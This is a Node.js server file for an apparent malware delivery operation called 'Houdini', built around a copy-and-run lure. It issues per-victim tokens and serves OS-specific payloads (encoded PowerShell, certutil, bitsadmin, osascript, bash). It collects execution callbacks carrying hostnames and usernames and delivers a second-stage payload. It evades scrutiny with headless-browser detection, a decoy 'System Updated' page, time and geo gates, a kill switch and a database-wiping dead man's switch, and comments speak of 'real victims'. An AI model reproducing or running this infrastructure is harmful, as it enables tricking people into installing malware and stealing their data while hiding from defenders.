const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const useragent = require('useragent');
const rateLimit = require('express-rate-limit');

const config = require('./config');
const { db, stmts } = require('./db');
const winPs1 = require('./payloads/win_ps1');
const winCert = require('./payloads/win_certutil');
const winBits = require('./payloads/win_bitsadmin');
const macOsascript = require('./payloads/mac_osascript');
const linuxBash = require('./payloads/linux_bash');

const app = express();
if (config.TRUST_PROXY > 0) app.set('trust proxy', config.TRUST_PROXY);
const server = http.createServer(app);
const io = new Server(server);

app.disable('x-powered-by');
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use('/dashboard', express.static('dashboard'));

// ---------- Helpers ----------

// Constant-time comparison for the admin key
function safeEqual(a, b) {
    const ab = Buffer.from(String(a || ''));
    const bb = Buffer.from(String(b || ''));
    if (ab.length !== bb.length || ab.length === 0) return false;
    return crypto.timingSafeEqual(ab, bb);
}

// Hour of day in the configured timezone (falls back to server-local on bad tz)
function currentHour() {
    try {
        const s = new Intl.DateTimeFormat('en-GB', {
            hour: '2-digit', hour12: false, timeZone: config.TIME_GATE_TZ
        }).format(new Date());
        return parseInt(s, 10);
    } catch (e) {
        return new Date().getHours();
    }
}

// ---------- Rate limiting (victim-facing /api routes ONLY) ----------
const victimLimiter = rateLimit({
    windowMs: config.RATE_LIMIT_WINDOW,
    limit: config.RATE_LIMIT_MAX,          // express-rate-limit v7 naming
    standardHeaders: 'draft-7',
    legacyHeaders: false,
    message: { error: 'Rate limit exceeded' }
});

const victimApi = express.Router();
victimApi.use(victimLimiter);

// ---------- Server-side bot detection ----------
// Strict patterns only. Generic "bot|crawl" matches real in-app browser UAs
// (Telegram/Facebook webviews, privacy browsers) and burned real victims.
// Note: /api/callback, /stage2 and /api/payload are NEVER passed through this —
// they are hit by curl/PowerShell/irm from the victim machine, not the browser.
function botCheck(req, res, next) {
    const ua = req.headers['user-agent'] || '';
    const suspicious = /Headless|PhantomJS|Selenium|Puppeteer|puppeteer|playwright/i.test(ua);
    if (suspicious) {
        stmts.flagBot.run(req.ip, ua, 'server-side pattern', Date.now());
        const t = req.query.t || (req.body && req.body.token);
        if (t) {
            try { stmts.flagTokenBot.run(t); } catch (e) {}
        }
    }
    next();
}
app.use(botCheck);

// ---------- Kill switch (per-route, never blocks admin/dashboard) ----------
function ensureLive(req, res, next) {
    const state = stmts.getState.get('killswitch');
    if (state && state.value === 'true') {
        return res.status(503).json({ error: 'Service temporarily unavailable' });
    }
    next();
}

// ---------- Token validation middleware (IP binding enforced EVERYWHERE) ----------
function tokenAuth(req, res, next) {
    const token =
        (req.query && req.query.token) ||
        (req.body && req.body.token) ||
        (req.headers && req.headers['x-houdini-token']);

    if (!token) return res.status(400).json({ error: 'Missing token' });

    const t = stmts.getToken.get(token);
    if (!t) return res.status(404).json({ error: 'Token not found' });
    if (t.expires_at < Date.now()) return res.status(410).json({ error: 'Token expired' });

    if (config.IP_BINDING && t.ip !== req.ip) {
        return res.status(403).json({ error: 'Token bound to different IP' });
    }

    req.houdiniToken = token;
    req.tokenRow = t;
    next();
}

// ---------- Decoy HTML ----------
const decoyHtml = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
*{box-sizing:border-box;} body{background:#f3f4f6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
.card{max-width:500px;background:white;padding:48px;border-radius:12px;box-shadow:0 4px 6px rgba(0,0,0,0.05);text-align:center;}
.icon{font-size:48px;margin-bottom:16px;}
h2{color:#059669;font-size:24px;margin-bottom:12px;font-weight:600;}
p{color:#6b7280;line-height:1.6;font-size:15px;}
.footer{margin-top:24px;font-size:12px;color:#9ca3af;}
</style>
</head>
<body>
<div class="card">
<div class="icon">✓</div>
<h2>System Updated</h2>
<p>Your system is already running the latest version.<br>No action is required at this time.</p>
<div class="footer">CloudSecure Maintenance • Build 2026.08.1</div>
</div>
</body>
</html>`;

// ---------- OS Detection from UA ----------
function detectOS(ua) {
    const agent = useragent.parse(ua);
    const os = agent.os.family;
    if (/Windows/i.test(os)) return 'Windows';
    if (/Mac OS|OS X/i.test(os)) return 'Mac OS';
    if (/Linux|Ubuntu|Debian|Fedora/i.test(os)) return 'Linux';
    return 'Windows';
}

// ---------- Token generation ----------
function generateToken(ip, ua) {
    const token = config.TOKEN_PREFIX + crypto.randomBytes(16).toString('hex');
    const os = detectOS(ua);
    const now = Date.now();
    stmts.insertToken.run(
        token, ip, ua, os, null, now, now + config.TOKEN_TTL,
        JSON.stringify([{ stage: 'viewed', timestamp: now }])
    );
    return { token, os };
}

// ---------- Main route — landing page ----------
app.get('/', ensureLive, (req, res) => {
    const preToken = req.query.t;

    // Time gate check (in configured timezone)
    const hour = currentHour();
    if (hour < config.TIME_GATE.start || hour >= config.TIME_GATE.end) {
        return res.status(403).send('Service unavailable at this time');
    }

    // Geo fence (requires Cloudflare — CF-IPCountry header)
    if (config.GEO_FENCE.length > 0) {
        const country = req.headers['cf-ipcountry'];
        if (country && !config.GEO_FENCE.includes(country)) {
            return res.status(403).send('Service unavailable in your region');
        }
    }

    let tokenData;
    if (preToken) {
        const existing = stmts.getToken.get(preToken);
        if (!existing) return res.status(403).send('Token invalid');
        if (config.IP_BINDING && existing.ip !== req.ip) {
            return res.status(403).send('Token bound to different IP');
        }
        tokenData = { token: preToken, os: existing.os_detected };

        // Bot-flagged token → decoy page, real flow never exposed
        if (existing.bot_flag === 1) return res.send(decoyHtml);
    } else {
        tokenData = generateToken(req.ip, req.headers['user-agent'] || '');
    }

    const html = fs.readFileSync(path.join(__dirname, 'public/index.html'), 'utf8');
    const rendered = html
        .replace('{{TOKEN}}', tokenData.token)
        .replace('{{OS}}', tokenData.os)
        .replace('{{SERVER}}', config.SERVER_URL);

    res.send(rendered);
});

// ---------- Victim-facing API (rate limited, IP-bound, kill-switched) ----------

// Beacon endpoint
victimApi.post('/api/beacon', ensureLive, tokenAuth, (req, res) => {
    const { stage, meta } = req.body;
    const token = req.houdiniToken;
    const t = req.tokenRow;

    // Flag token if client-side bot detection triggered
    if (stage === 'bot_detected') {
        try { stmts.flagTokenBot.run(token); } catch (e) {}
    }

    const stages = JSON.parse(t.stages || '[]');
    stages.push({ stage, timestamp: Date.now(), meta });
    stmts.updateStages.run(JSON.stringify(stages), token);

    io.emit('stats', getStatsData());
    res.json({ ok: true });
});

// Payload endpoint
victimApi.get('/api/payload', ensureLive, tokenAuth, (req, res) => {
    const token = req.houdiniToken;
    const os = req.query.os;

    // Bot-flagged token → harmless decoy payload
    if (req.tokenRow.bot_flag === 1) {
        return res.json({
            payload: 'Write-Host "System already up to date."',
            prestige: config.PRESTIGE_URL,
            prestigeDelay: config.PRESTIGE_DELAY
        });
    }

    stmts.updateStages.run(
        JSON.stringify([...JSON.parse(req.tokenRow.stages || '[]'),
            { stage: 'os_confirmed', timestamp: Date.now(), meta: { os } }]),
        token
    );

    let payload;
    const isDemo = config.DEMO_MODE;

    if (os === 'mac' || os === 'Mac OS') {
        payload = macOsascript.generate(token, config.SERVER_URL);
    } else if (os === 'linux' || os === 'Linux') {
        payload = linuxBash.generate(token, config.SERVER_URL);
    } else {
        // Windows — primary PowerShell -enc, with fallbacks via variant param
        const variant = req.query.variant || 'ps1';
        if (variant === 'cert') payload = winCert.generate(token, config.SERVER_URL);
        else if (variant === 'bits') payload = winBits.generate(token, config.SERVER_URL);
        else payload = winPs1.generate(token, config.SERVER_URL, isDemo);
    }

    res.json({
        payload,
        prestige: config.PRESTIGE_URL,
        prestigeDelay: config.PRESTIGE_DELAY
    });
});

// Callback endpoint (execution confirmation)
victimApi.post('/api/callback', ensureLive, tokenAuth, (req, res) => {
    const token = req.houdiniToken;
    const { h, u, d } = req.body;
    const t = req.tokenRow;

    stmts.markExecuted.run(JSON.stringify({ hostname: h, username: u, data: d }), token);

    const stages = JSON.parse(t.stages || '[]');
    stages.push({ stage: 'callback', timestamp: Date.now(), meta: { h, u, d } });
    stmts.updateStages.run(JSON.stringify(stages), token);

    io.emit('stats', getStatsData());
    res.json({ ok: true, next: 'stage2' });
});

app.use(victimApi);

// ---------- Stage 2 delivery (kill-switched, IP-bound, no rate limit — victim machine fetches this) ----------
app.get('/stage2', ensureLive, tokenAuth, (req, res) => {
    if (req.tokenRow.bot_flag === 1) {
        return res.type('text/plain').send('# System already up to date. No payload.');
    }

    const payloadPath = path.join(__dirname, 'payloads/stage2', config.ACTIVE_PAYLOAD);
    try {
        const payload = fs.readFileSync(payloadPath, 'utf8');
        res.type('text/plain').send(payload);
    } catch (e) {
        res.status(500).send('// Payload not found');
    }
});

// ---------- Admin API (NOT rate limited, NOT kill-switched) ----------
function requireAdmin(req, res, next) {
    if (!safeEqual(req.headers['x-admin-key'], config.ADMIN_KEY)) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
}

app.get('/api/admin/stats', requireAdmin, (req, res) => {
    res.json(getStatsData());
});

app.post('/api/admin/killswitch', requireAdmin, (req, res) => {
    const { active } = req.body;
    stmts.setState.run('killswitch', active ? 'true' : 'false');
    io.emit('killState', active);
    res.json({ killSwitch: active });
});

app.post('/api/admin/heartbeat', requireAdmin, (req, res) => {
    stmts.setState.run('last_heartbeat', Date.now().toString());
    res.json({ ok: true });
});

function getStatsData() {
    const since = Date.now() - 24 * 60 * 60 * 1000;
    const stats = stmts.getStats.get(since);
    const recent = stmts.getRecent.all();

    // Calculate funnel
    const funnel = { viewed: 0, checked: 0, copied: 0, executed: 0 };
    recent.forEach(t => {
        const stages = JSON.parse(t.stages || '[]').map(s => s.stage);
        if (stages.includes('viewed')) funnel.viewed++;
        if (stages.includes('check_passed')) funnel.checked++;
        if (stages.includes('copied')) funnel.copied++;
        if (t.executed) funnel.executed++;
    });

    return {
        total: stats.total,
        executed: stats.executed,
        bots: stats.bots,
        funnel,
        recent
    };
}

// ---------- Dead man's switch (2 consecutive failed checks + active tokens required) ----------
let dmsStrikes = 0;
setInterval(() => {
    if (!config.DEAD_MAN_ENABLED) return;
    const active = stmts.getActiveTokens.get(Date.now()).count;
    if (active === 0) { dmsStrikes = 0; return; } // nothing live — nothing to protect

    const last = stmts.getState.get('last_heartbeat');
    if (last && (Date.now() - parseInt(last.value, 10)) > config.DEAD_MAN_TIMEOUT) {
        dmsStrikes++;
        console.log(`[Houdini] Dead man check failed (${dmsStrikes}/2)`);
        if (dmsStrikes >= 2) {
            console.log('[Houdini] Dead man triggered — purging database');
            db.exec('DELETE FROM tokens; DELETE FROM bot_hits;');
            stmts.setState.run('killswitch', 'true');
            dmsStrikes = 0;
        }
    } else {
        dmsStrikes = 0;
    }
}, 60000);

// ---------- Cleanup expired tokens + bot hits ----------
setInterval(() => {
    stmts.purgeExpired.run(Date.now());
    stmts.purgeBotHits.run(Date.now() - 7 * 24 * 60 * 60 * 1000); // keep 7 days
}, 300000);

// ---------- Socket.IO (ADMIN-AUTHENTICATED — no more public stats leak) ----------
io.use((socket, next) => {
    const key = socket.handshake.auth && socket.handshake.auth.adminKey;
    if (!safeEqual(key, config.ADMIN_KEY)) return next(new Error('unauthorized'));
    next();
});

io.on('connection', (socket) => {
    socket.emit('stats', getStatsData());
    const ks = stmts.getState.get('killswitch');
    socket.emit('killState', ks && ks.value === 'true');

    // Dashboard refresh button
    socket.on('admin:refresh', () => {
        socket.emit('stats', getStatsData());
    });
});

// ---------- Boot ----------
if (config.ADMIN_KEY === 'houdini-admin-change-me-now' && !process.env.ADMIN_KEY) {
    console.warn('[Houdini] *** WARNING: ADMIN_KEY is still the default. Set ADMIN_KEY env var or edit config.js before deploying. ***');
}

// Seed kill switch from config on first boot
const ksState = stmts.getState.get('killswitch');
if (!ksState && config.KILL_SWITCH) stmts.setState.run('killswitch', 'true');

server.listen(config.PORT, () => {
    console.log(`[Houdini] Server running on port ${config.PORT}`);
    console.log(`[Houdini] Dashboard: ${config.SERVER_URL}/dashboard`);
    console.log(`[Houdini] Demo mode: ${config.DEMO_MODE}`);
    console.log(`[Houdini] Kill switch: ${(stmts.getState.get('killswitch') || {}).value === 'true' ? 'ACTIVE' : 'inactive'}`);
    console.log(`[Houdini] Trust proxy: ${config.TRUST_PROXY} | IP binding: ${config.IP_BINDING ? 'ON' : 'OFF'}`);
});